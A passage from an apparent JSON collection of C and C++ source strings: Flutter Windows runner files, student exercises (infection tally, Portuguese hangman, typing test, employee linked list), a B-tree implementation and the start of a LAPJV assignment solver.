}\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//A program that keeps track of the infected people around the world\r\n#include <iostream>\r\nusing namespace std;\r\nint main ()\r\n{\r\n\tint countries, infected;\r\n\tfloat sum, average;\r\n\r\n\t\r\n\tcout << \"This is a program that keeps track of the infected people around the world\" << endl << endl;\r\n\t\r\n\t\r\n\tcout << \"Enter the number of the countries: \"; // stores the number of countries (the number of times the loop will continue)\r\n\tcin >> countries;\r\n\t\r\n\t\t// create an array that stores each name of each country and the number of infected people in these countries\r\n\tstring array[countries];\r\n\tint arr[countries];\r\n\r\n\r\n\r\n\tfor (int i = 0; i < countries; i++)\r\n\t{\r\n\t\tcout << \"Enter name of country number \" << i + 1 << \" and the number of infected people in it: \";\r\n\t\tcin >> array[i];\r\n\t\tcin >> arr[i];\r\n\t\tcout << endl;\r\n\t\t\r\n    }\r\n\t\r\n\tcout << endl << endl;\r\n\r\n\r\n    // create a loop to be able to sum the total number of cases for all countries\r\n    for (int s = 0; s < countries; s++)\r\n    {\r\n    \tsum+=arr[s];\r\n\t}\r\n\tcout << \"The total number of infected cases for all countries is: \" << sum << endl;\r\n\t\r\n\t\r\n\t// get the average by dividing the sum of cases and the total number of values\r\n\taverage = sum/countries;\r\n\tcout << \"The average infections for all countries is: \" << average << endl;\r\n\t\r\n\tint max = arr[0];\r\n\t// create a loop to be able to find the highest number of infection\r\n    for(int m = 1; m < countries; m++)\r\n    {\r\n    \t\r\n\r\n       if(max < arr[m]) \r\n       {\r\n       \t  max = arr[m]; \r\n\t   }\r\n\r\n    }\r\n    cout << \"The highest number of infections is: \" << max; \r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#include <iostream>\n#include <stdlib.h>\nusing namespace std;\n\nint main(){\n    \n    char palavra[30], letra[1], secreta[30];\n    int tam, i, chances, acertos;\n    bool acerto;\n    \n    chances = 6;\n    tam = 0;\n    i = 0;\n    acerto = false;\n    acertos = 0;\n    \n    cout << \"Digite a palavra secreta: \\n\";\n    cin >> palavra;\n    system (\"clear\");\n    \n    while (palavra[i] != '\\0'){\n        i++;\n        tam++;\n    }\n    \n    for(i=0; i<tam; i++){\n        secreta[i] = '-';\n    }\n    \n    while ((chances > 0) && (acertos < tam)){\n        cout << \"Chances restantes: \" << chances << \"\\n\\n\";\n        cout << \"Palvra secreta: \";\n        for(i=0; i<tam; i++){\n            cout << secreta[i];\n        }\n        cout << \"\\n\\nDigite uma letra: \";\n        cin >> letra[0];\n        for(i=0; i<tam; i++){\n            if (palavra[i] == letra[0]){\n                acerto = true;\n                secreta[i] = palavra[i];\n                acertos++;\n            }\n        }\n        if (!acerto){\n            chances--;\n        }\n        acerto = false;\n        system(\"clear\");\n    }\n    if (acertos==tam){\n        cout << \"Voce venceu\";\n        \n    }else{\n        cout << \"perdeu, burro!\"; \n    }\n    return 0;\n    \n}",
    "// WRITTEN BY:  Keenan Mayuga and Margarita Bautista\r\n// SECTION: EQ1       \r\n//                \r\n// FOR COURSE:    LBYEC2B\r\n//\r\n// PURPOSE:\r\n// This program assess the typing speed and accuracy of the user.\r\n//\r\n// OVERALL METHOD/ALGORITHM:\r\n// The list of general tasks is:\r\n// 1. Display a main menu and ask the user to select.\r\n// 2. Execute the menu item.\r\n//    2-1. If selected menu item is '1', perform register\r\n//         2-1-1. Asks the user to enter first name, last name, username, and password\r\n//         2-1-2. If the registration is successful, the main menu will be shown again. \r\n//         2-1-3. If the the user attempts to register with the same username and password, \r\n//                a message will appear telling the user that the user already exists and is ask \r\n//                whether to go back to the main menu or try again\r\n//                2-1-3-1. If selected menu item is 'x' or 'X', display main menu\r\n//                2-1-3-2. If selected menu item is 'y' or 'Y', asks for a username again.\r\n//    2-2. If selected menu item is '2', perform login\r\n//         2-2-1. If the login is successful, display usermenu to select.\r\n//                2-2-1-1. If selected menu item is '1', display text selection menu and ask the user to select\r\n//                         2-2-1-1-1. Display the chosen text\r\n//                         2-2-1-1-2. Ask the user the number of lines to be typed\r\n//                         2-2-1-1-3. Ask the user to start typing\r\n//                         2-2-1-1-4. Display the results (number of words correct, number of words incorrect, \r\n//                                    accuracy, typing time, and speed)\r\n//                2-2-1-2. If selected menu item is '2', display the profile of the user\r\n//                2-2-1-3. If selected menu item is '3', display the statistics of mistyped words\r\n//                2-2-1-4. If selected menu item is '4', logout and display main menu\r\n//                2-2-1-5. If selected menu item is '5', exit the program\r\n//         2-2-2. If the username is not verified, a message will appear\r\n//                telling the user that the user does not exists and is asked whether to go back to main menu\r\n//                or try again\r\n//                2-2-2-1. If selected menu item is 'x' or 'X', display main menu\r\n//                2-2-2-2. If selected menu item is 'y' or 'Y', asks for a username again \r\n//         2-2-3. If the password is incorrect, a message will appear telling the user that the password is incorrect \r\n//                is asked whether to go back to main menu or try again\r\n//                2-2-3-1. If selected menu item is 'x' or 'X', display main menu\r\n//                2-2-3-2. If selected menu item is 'y' or 'Y', asks for a password again \r\n//         \r\n//    2-3. If selected menu item is '3', exit the program\r\n//\r\n// CREDITS:\r\n//     https://github.com/iamsahil1910/Typing-Test\r\n// \r\n// FUNCTIONS:\r\n//\r\n// main_menu\r\n//    display the menu\r\n//\r\n// reg\r\n//    ask user to register\r\n//\r\n// login\r\n//    ask user to login\r\n//\r\n// usermenu\r\n//    display the menu for the game\r\n//\r\n// myprofile\r\n//    displays the past records of the user\r\n// \r\n// listTest\r\n//    display menu for text selection\r\n//\r\n// Test\r\n//    executes the typing game and shows the result\r\n//\r\n// Statistics\r\n//    displays statistics of mistyped words\r\n//\r\n// INCLUDED FILES:\r\n//    typing.h\r\n//\r\n// DATA FILES:\r\n//    username.txt\r\n//    check.txt\r\n//    mistake.txt\r\n#include \"typing.h\"\r\n\r\nType game;\r\n\r\nType *start = NULL, *last = NULL;\r\n\r\n// FUNCTION NAME: main_menu\r\n// CREDITS:\r\n//           \r\n// PARAMETERS: None\r\n//\r\n// RETURN VALUE: None          \r\n//\r\n// CALLS TO: none\r\n//\r\n// CALLED FROM: main()\r\n//\r\n// METHOD:\r\n//\r\n// This function displays the main menu\r\nvoid main_menu()\r\n{\r\n\tint choice;//menu key variable\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tprintf(\"\\t      __    _____ _____    _____ _____ \\n\");\r\n\t\tprintf(\"\\t     |  |  |     |   __|  |     |   | |\\n\");\r\n\t\tprintf(\"\\t     |  |__|  |  |  |  |  |-   -| | | |\\n\");\r\n\t\tprintf(\"\\t     |_____|_____|_____|  |_____|_|___|\\n\");\r\n\t\tprintf(\"\\n*************************** TYPING TEST ******************************\\n\");\t\r\n\t\tprintf(\"=========================== LOG IN ==================================\\n\");\r\n\t\tprintf(\"(1) Register\\n\");\r\n\t\tprintf(\"(2) Log In\\n\");\r\n\t\tprintf(\"(3) Exit\\n\");\r\n\t\tprintf(\"Enter Choice: \");\r\n\t\tchoice = getch() - 48;\r\n\t\r\n\t\tswitch(choice)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\t{\r\n\t\t\t\t\tgame.reg();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\tcase 2:\r\n\t\t\t\t{\r\n\t\t\t\t\tgame.login();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\tcase 3:\r\n\t\t\t\t{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\\n Invalid input.\");\r\n\t\t\t\t}\r\n\t\t}\r\n\t}\r\n\twhile (choice != '3'); //if the choice is not 3, redisplay the menu\r\n}\r\n\r\n// FUNCTION NAME: reg\r\n// CREDITS:\r\n//    Ken Camacho\r\n//    https://www.crazyengineers.com/threads/user-login-and-registration-using-files-in-c.55378\r\n//           \r\n// PARAMETERS: None\r\n//\r\n// RETURN VALUE: None          \r\n//\r\n// CALLS TO: none\r\n//\r\n",
    "#include <stdio.h>\r\n #include <stdlib.h>\r\n #define MAX 4\r\n #define MIN 2\r\n struct btreeNode {\r\n int val[MAX + 1], count;\r\n struct btreeNode *link[MAX + 1];\r\n };\r\n struct btreeNode *root;\r\n /* creating new node */\r\n struct btreeNode * createNode(int val, struct btreeNode *child) {\r\n struct btreeNode *newNode;\r\n newNode = (struct btreeNode *)malloc(sizeof(struct btreeNode));\r\n newNode->val[1] = val;\r\n newNode->count = 1;\r\n\r\n newNode->link[0] = root;\r\n newNode->link[1] = child;\r\n return newNode;\r\n }\r\n /* Places the value in appropriate position */\r\n void addValToNode(int val, int pos, struct btreeNode *node,\r\n struct btreeNode *child) {\r\n int j = node->count;\r\n while (j > pos) {\r\n node->val[j + 1] = node->val[j];\r\n node->link[j + 1] = node->link[j];\r\n j--;\r\n }\r\n node->val[j + 1] = val;\r\n node->link[j + 1] = child;\r\n node->count++;\r\n }\r\n /* split the node */\r\n void splitNode (int val, int *pval, int pos, struct btreeNode *node,\r\n struct btreeNode *child, struct btreeNode **newNode) {\r\n int median, j;\r\n if (pos > MIN)\r\n median = MIN + 1;\r\n else\r\n median = MIN;\r\n *newNode = (struct btreeNode *)malloc(sizeof(struct btreeNode));\r\n j = median + 1;\r\n while (j <= MAX) {\r\n (*newNode)->val[j - median] = node->val[j];\r\n (*newNode)->link[j - median] = node->link[j];\r\n\r\n j++;\r\n }\r\n node->count = median;\r\n (*newNode)->count = MAX - median;\r\n if (pos <= MIN) {\r\n addValToNode(val, pos, node, child);\r\n } else {\r\n addValToNode(val, pos - median, *newNode, child);\r\n }\r\n *pval = node->val[node->count];\r\n (*newNode)->link[0] = node->link[node->count];\r\n node->count--;\r\n }\r\n /* sets the value val in the node */\r\n int setValueInNode(int val, int *pval,\r\n struct btreeNode *node, struct btreeNode **child) {\r\n int pos;\r\n if (!node) {\r\n *pval = val;\r\n *child = NULL;\r\n return 1;\r\n }\r\n if (val < node->val[1]) {\r\n pos = 0;\r\n } else {\r\n for (pos = node->count;\r\n (val < node->val[pos] && pos > 1); pos--);\r\n if (val == node->val[pos]) {\r\n printf(\"Duplicates not allowed\\n\");\r\n return 0;\r\n\r\n }\r\n }\r\n if (setValueInNode(val, pval, node->link[pos], child)) {\r\n if (node->count < MAX) {\r\n addValToNode(*pval, pos, node, *child);\r\n } else {\r\n splitNode(*pval, pval, pos, node, *child, child);\r\n return 1;\r\n }\r\n }\r\n return 0;\r\n }\r\n /* insert val in B-Tree */\r\n void insertion(int val) {\r\n int flag, i;\r\n struct btreeNode *child;\r\n flag = setValueInNode(val, &i, root, &child);\r\n if (flag)\r\n root = createNode(i, child);\r\n }\r\n /* copy successor for the value to be deleted */\r\n void copySuccessor(struct btreeNode *myNode, int pos) {\r\n struct btreeNode *dummy;\r\n dummy = myNode->link[pos];\r\n for (;dummy->link[0] != NULL;)\r\n dummy = dummy->link[0];\r\n myNode->val[pos] = dummy->val[1];\r\n }\r\n /* removes the value from the given node and rearrange values */\r\n\r\n void removeVal(struct btreeNode *myNode, int pos) {\r\n int i = pos + 1;\r\n while (i <= myNode->count) {\r\n myNode->val[i - 1] = myNode->val[i];\r\n myNode->link[i - 1] = myNode->link[i];\r\n i++;\r\n }\r\n myNode->count--;\r\n }\r\n /* shifts value from parent to right child */\r\n void doRightShift(struct btreeNode *myNode, int pos) {\r\n struct btreeNode *x = myNode->link[pos];\r\n int j = x->count;\r\n while (j > 0) {\r\n x->val[j + 1] = x->val[j];\r\n x->link[j + 1] = x->link[j];\r\n }\r\n x->val[1] = myNode->val[pos];\r\n x->link[1] = x->link[0];\r\n x->count++;\r\n x = myNode->link[pos - 1];\r\n myNode->val[pos] = x->val[x->count];\r\n myNode->link[pos] = x->link[x->count];\r\n x->count--;\r\n return;\r\n }\r\n /* shifts value from parent to left child */\r\n void doLeftShift(struct btreeNode *myNode, int pos) {\r\n int j = 1;\r\n struct btreeNode *x = myNode->link[pos - 1];\r\n\r\n x->count++;\r\n x->val[x->count] = myNode->val[pos];\r\n x->link[x->count] = myNode->link[pos]->link[0];\r\n x = myNode->link[pos];\r\n myNode->val[pos] = x->val[1];\r\n x->link[0] = x->link[1];\r\n x->count--;\r\n while (j <= x->count) {\r\n x->val[j] = x->val[j + 1];\r\n x->link[j] = x->link[j + 1];\r\n j++;\r\n }\r\n return;\r\n }\r\n /* merge nodes */\r\n void mergeNodes(struct btreeNode *myNode, int pos) {\r\n int j = 1;\r\n struct btreeNode *x1 = myNode->link[pos], *x2 = myNode->link[pos - 1];\r\n x2->count++;\r\n x2->val[x2->count] = myNode->val[pos];\r\n x2->link[x2->count] = myNode->link[0];\r\n while (j <= x1->count) {\r\n x2->count++;\r\n x2->val[x2->count] = x1->val[j];\r\n x2->link[x2->count] = x1->link[j];\r\n j++;\r\n }\r\n j = pos;\r\n while (j < myNode->count) {\r\n myNode->val[j] = myNode->val[j + 1];\r\n\r\n myNode->link[j] = myNode->link[j + 1];\r\n j++;\r\n }\r\n myNode->count--;\r\n free(x1);\r\n }\r\n /* adjusts the given node */\r\n void adjustNode(struct btreeNode *myNode, int pos) {\r\n if (!pos) {\r\n if (myNode->link[1]->count > MIN) {\r\n doLeftShift(myNode, 1);\r\n } else {\r\n mergeNodes(myNode, 1);\r\n }\r\n } else {\r\n if (myNode->count != pos) {\r\n if(myNode->link[pos - 1]->count > MIN) {\r\n doRightShift(myNode, pos);\r\n } else {\r\n if (myNode->link[pos + 1]->count > MIN) {\r\n doLeftShift(myNode, pos + 1);\r\n } else {\r\n mergeNodes(myNode, pos);\r\n }\r\n }\r\n } else {\r\n if (myNode->link[pos - 1]->count > MIN)\r\n doRightShift(myNode, pos);\r\n else\r\n mer",
    "#include <iostream>\n#include <locale.h>\n#include <string>\nusing namespace std;\n\nstruct Funcionario {\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n\tFuncionario *prox;\n};\n\nFuncionario* init() {\n\treturn NULL;\n}\n\nbool isEmpty(Funcionario* lista) {\n\treturn (lista == NULL);\n}\n\nFuncionario* insert(Funcionario* lista, int prontuario, string nome, double salario) {\n\tFuncionario* novo = new Funcionario();\n\tnovo->prontuario = prontuario;\n\tnovo->nome = nome;\n\tnovo->salario = salario;\n\tnovo->prox = lista;\n\treturn novo;\n};\n\nvoid printLista(Funcionario* lista) {\n\tFuncionario* aux;\n\tstring line(20, '-');\n\taux = lista;\n\tdouble totalSalarios = 0;\n\tif (isEmpty(lista)) {\n\t\tcout << \"Lista vazia.\" << endl;\n\t} else {\n\t\tcout << \"Lista de funcion\u00e1rios: \\n\" << endl;\n\t\tcout << line << endl;\n\t\twhile (aux != NULL) {\n\t\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t\t\tcout << line << endl;\n\t\t\ttotalSalarios = totalSalarios + aux->salario;\n\t\t\taux = aux->prox;\n\t\t}\n\t\tcout << \"\\nTotal de sal\u00e1rios: \" << totalSalarios << endl;\n\t\tcout << \"\\nFim da lista.\" << endl;\n\t}\n}\n\nvoid printFuncionario(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\tif (aux) {\n\t\tcout << \"\\nFuncion\u00e1rio encontrado: \" << endl;\n\t\tcout << endl;\n\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t} else {\n\t\tcout << \"\\nFuncion\u00e1rio n\u00e3o encontrado.\" << endl;\n\t}\n}\n\nFuncionario* find(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\treturn aux;\n}\n\nFuncionario* remove(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\tFuncionario* ant = NULL;\n\taux = lista;\n\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\tant = aux;\n\t\taux = aux->prox;\n\t}\n\n\tif (aux == NULL) {\n\t\treturn lista;\n\t}\n\n\tif (ant == NULL) {\n\t\tlista = aux->prox;\n\t}\n\n\telse {\n\t\tant->prox = aux->prox;\n\t}\n\n\tfree(aux);\n\treturn lista;\n}\n\nvoid freeLista(Funcionario* lista) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL) {\n\t\tFuncionario *ant = aux->prox;\n\t\tfree(aux);\n\t\taux = ant;\n\t}\t\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"\");\n\t\n  \tFuncionario *listaFuncionarios;\n\tlistaFuncionarios = init();\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n  \tint opcao;\n  \n  \tdo {\n\t\tstring line(40, '-');\n\t\tcout << \"0. Sair\\n\";\n\t\tcout << \"1. Incluir\\n\";\n\t\tcout << \"2. Excluir\\n\";\n\t\tcout << \"3. Pesquisar\\n\";\n\t\tcout << \"4. Listar\\n\";\n\t\tcout << \"Op\u00e7\u00e3o: \";\n\t\tcin >> opcao;\n\n    \t\tswitch (opcao) {\n\t\t\tcase 0:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Encerrando programa...\\n\";\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase 1:\n\t\t\t\tcout << line << endl;\n        \t\t\tcout << \"Digite o prontuario: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tif (find(listaFuncionarios, prontuario)) {\n\t\t\t\t\tcout << \"Funcion\u00e1rio j\u00e1 cadastrado!\\n\";\n\t\t\t\t\tcout << line << endl;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcout << \"Digite o nome: \";\n\t\t\t\tcin >> nome;\n        \t\t\tcout << \"Digite o salario: \";\n\t\t\t\tcin >> salario;\n\t\t\t\tlistaFuncionarios = insert(listaFuncionarios, prontuario, nome, salario);\n        \t\t\tcout << \"Funcion\u00e1rio cadastrado com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 2:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser exclu\u00eddo: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tlistaFuncionarios = remove(listaFuncionarios, prontuario);\n\t\t\t\tcout << \"Funcion\u00e1rio exclu\u00eddo com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\t\t\t\n\t\t\tcase 3:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser pesquisado: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tprintFuncionario(listaFuncionarios, prontuario);\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 4:\n\t\t\t\tcout << line << endl;\n\t\t\t\tprintLista(listaFuncionarios);\n\t\t\t\tcout << line << endl;\n\t\t}  \t\n  } while (opcao != 0);\n\n\tfreeLista(listaFuncionarios);\n\n\treturn 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n#include \"lapjv.h\"\r\n\r\n/** Column-reduction and reduction transfer for a dense cost matrix.\r\n */\r\nint_t _ccrrt_dense(const uint_t n, cost_t *cost[],\r\n\tint_t *free_rows, int_t *x, int_t *y, cost_t *v)\r\n{\r\n\tint_t n_free_rows;\r\n\tboolean *unique;\r\n\r\n\tfor (uint_t i = 0; i < n; i++) {\r\n\t\tx[i] = -1;\r\n\t\tv[i] = LARGE;\r\n\t\ty[i] = 0;\r\n\t}\r\n\tfor (uint_t i = 0; i < n; i++) {\r\n\t\tfor (uint_t j = 0; j < n; j++) {\r\n\t\t\tconst cost_t c = cost[i][j];\r\n\t\t\tif (c < v[j]) {\r\n\t\t\t\tv[j] = c;\r\n\t\t\t\ty[j] = i;\r\n\t\t\t}\r\n\t\t\tPRINTF(\"i=%d, j=%d, c[i,j]=%f, v[j]=%f y[j]=%d\\n\", i, j, c, v[j], y[j]);\r\n\t\t}\r\n\t}\r\n\tPRINT_COST_ARRAY(v, n);\r\n\tPRINT_INDEX_ARRAY(y, n);\r\n\tNEW(unique, boolean, n);\r\n\tmemset(unique, TRUE, n);\r\n\t{\r\n\t\tint_t j = n;\r\n\t\tdo {\r\n\t\t\tj--;\r\n\t\t\tconst int_t i = y[j];\r\n\t\t\tif (x[i] < 0) {\r\n\t\t\t\tx[i] = j;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tunique[i] = FALSE;\r\n\t\t\t\ty[j] = -1;\r\n\t\t\t}\r\n\t\t} while (j > 0);\r\n\t}\r\n\tn_free_rows = 0;\r\n\tfor (uint_t i = 0; i < n; i++) {\r\n\t\tif (x[i] < 0) {\r\n\t\t\tfree_rows[n_free_rows++] = i;\r\n\t\t}\r\n\t\telse if (unique[i]) {\r\n\t\t\tconst int_t j = x[i];\r\n\t\t\tcost_t min = LARGE;\r\n\t\t\tfor (uint_t j2 = 0; j2 < n; j2++) {\r\n\t\t\t\tif (j2 == (uint_t)j) {\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\tconst cost_t c = cost[i][j2] - v[j2];\r\n\t\t\t\tif (c < min) {\r\n\t\t\t\t\tmin = c;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tPRINTF(\"v[%d] = %f - %f\\n\", j, v[j], min);\r\n\t\t\tv[j] -= min;\r\n\t\t}\r\n\t}\r\n\tFREE(unique);\r\n\treturn n_free_rows;\r\n}\r\n\r\n\r\n/** Augmenting row reduction for a dense cost matrix.\r\n */\r\nint_t _carr_dense(\r\n\tconst uint_t n, cost_t *cost[],\r\n\tconst uint_t n_free_rows,\r\n\tint_t *free_rows, int_t *x, int_t *y, cost_t *v)\r\n{\r\n\tuint_t current = 0;\r\n\tint_t new_free_rows = 0;\r\n\tuint_t rr_cnt = 0;\r\n\tPRINT_INDEX_ARRAY(x, n);\r\n\tPRINT_INDEX_ARRAY(y, n);\r\n\tPRINT_COST_ARRAY(v, n);\r\n\tPRINT_INDEX_ARRAY(free_rows, n_free_rows);\r\n\twhile (current < n_free_rows) {\r\n\t\tint_t i0;\r\n\t\tint_t j1, j2;\r\n\t\tcost_t v1, v2, v1_new;\r\n\t\tboolean v1_lowers;\r\n\r\n\t\trr_cnt++;\r\n\t\tPRINTF(\"current = %d rr_cnt = %d\\n\", current, rr_cnt);\r\n\t\tconst int_t free_i = free_rows[current++];\r\n\t\tj1 = 0;\r\n\t\tv1 = cost[free_i][0] - v[0];\r\n\t\tj2 = -1;\r\n\t\tv2 = 